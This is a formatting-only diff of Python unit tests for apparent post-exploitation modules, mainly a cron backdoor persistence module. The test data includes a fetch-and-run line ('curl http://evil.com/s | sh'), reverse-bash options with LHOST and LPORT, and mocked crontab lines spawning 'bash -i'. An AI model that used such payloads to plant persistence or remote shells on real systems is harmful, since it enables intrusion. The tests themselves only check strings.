@@ -2,16 +2,15 @@
 # Post-Exploitation Modülleri — Birim Testleri
 # =============================================================================
 
-import pytest
-import os
-import sys
-from unittest.mock import MagicMock, patch, mock_open
+from unittest.mock import MagicMock, patch
 
-# ── System Info ──────────────────────────────────────────────────────────────
-from modules.post.gather.system_info import system_info
+import pytest
 
 # ── Credentials ──────────────────────────────────────────────────────────────
 from modules.post.gather.credentials import credentials
+
+# ── System Info ──────────────────────────────────────────────────────────────
+from modules.post.gather.system_info import system_info
 
 # ── Cron Backdoor ────────────────────────────────────────────────────────────
 from modules.post.persist.cron_backdoor import cron_backdoor
@@ -158,8 +157,12 @@ class TestCronBackdoor:
         assert "PAYLOAD_CMD" in mod.Options
 
     def test_build_payload_reverse_bash(self, mod):
-        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
-                "PAYLOAD_TYPE": "reverse_bash"}
+        opts = {
+            "LHOST": "10.0.0.1",
+            "LPORT": "4444",
+            "SCHEDULE": "*/5 * * * *",
+            "PAYLOAD_TYPE": "reverse_bash",
+        }
         line = mod._build_payload_line(opts)
         assert "10.0.0.1" in line
         assert "4444" in line
@@ -167,8 +170,11 @@ class TestCronBackdoor:
         assert "# MAH-PERSIST" in line
 
     def test_build_payload_custom(self, mod):
-        opts = {"PAYLOAD_TYPE": "custom", "PAYLOAD_CMD": "curl http://evil.com/s | sh",
-                "SCHEDULE": "0 * * * *"}
+        opts = {
+            "PAYLOAD_TYPE": "custom",
+            "PAYLOAD_CMD": "curl http://evil.com/s | sh",
+            "SCHEDULE": "0 * * * *",
+        }
         line = mod._build_payload_line(opts)
         assert "curl" in line
         assert "# MAH-PERSIST" in line
@@ -183,32 +189,49 @@ class TestCronBackdoor:
         result = mod._action_list()
         assert result is True
 
-    @patch.object(cron_backdoor, "_get_crontab",
-                  return_value="*/5 * * * * /bin/bash -c 'bash -i' # MAH-PERSIST\n0 * * * * /usr/bin/backup\n")
+    @patch.object(
+        cron_backdoor,
+        "_get_crontab",
+        return_value="*/5 * * * * /bin/bash -c 'bash -i' # MAH-PERSIST\n0 * * * * /usr/bin/backup\n",
+    )
     def test_action_list_with_entries(self, mock_crontab, mod):
         result = mod._action_list()
         assert result is True
 
     @patch.object(cron_backdoor, "_set_crontab", return_value=True)
-    @patch.object(cron_backdoor, "_get_crontab", return_value="0 * * * * /usr/bin/backup\n")
+    @patch.object(
+        cron_backdoor, "_get_crontab", return_value="0 * * * * /usr/bin/backup\n"
+    )
     def test_action_add_success(self, mock_get, mock_set, mod):
-        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
-                "PAYLOAD_TYPE": "reverse_bash"}
+        opts = {
+            "LHOST": "10.0.0.1",
+            "LPORT": "4444",
+            "SCHEDULE": "*/5 * * * *",
+            "PAYLOAD_TYPE": "reverse_bash",
+        }
         result = mod._action_add(opts)
         assert result is True
         mock_set.assert_called_once()
 
-    @patch.object(cron_backdoor, "_get_crontab",
-                  return_value="*/5 * * * * cmd # MAH-PERSIST\n")
+    @patch.object(
+        cron_backdoor, "_get_crontab", return_value="*/5 * * * * cmd # MAH-PERSIST\n"
+    )
     def test_action_add_duplicate(self, mock_get, mod):
-        opts = {"LHOST": "10.0.0.1", "LPORT": "4444", "SCHEDULE": "*/5 * * * *",
-                "PAYLOAD_TYPE": "reverse_bash"}
+        opts = {
+            "LHOST": "10.0.0.1",
+            "LPORT": "4444",
+            "SCHEDULE": "*/5 * * * *",
+            "PAYLOAD_TYPE": "reverse_bash",
+        }
         result = mod._action_add(opts)
         assert result is False
 
     @patch.object(cron_backdoor, "_set_crontab", return_value=True)
-    @patch.object(cron_backdoor, "_get_crontab",
-                  return_value="0 * * * * backup\n*/5 * * * * evil # MAH-PERSIST\n")
+    @patch.object(
+        cron_backdoor,
+        "_get_crontab",
+        return_value="0 * * * * backup\n*/5 * * * * evil # MAH-PERSIST\n",
+    )
     def test_action_remove(self, mock_get, mock_set, mod):
         result = mod._action_remove()
         assert result is True
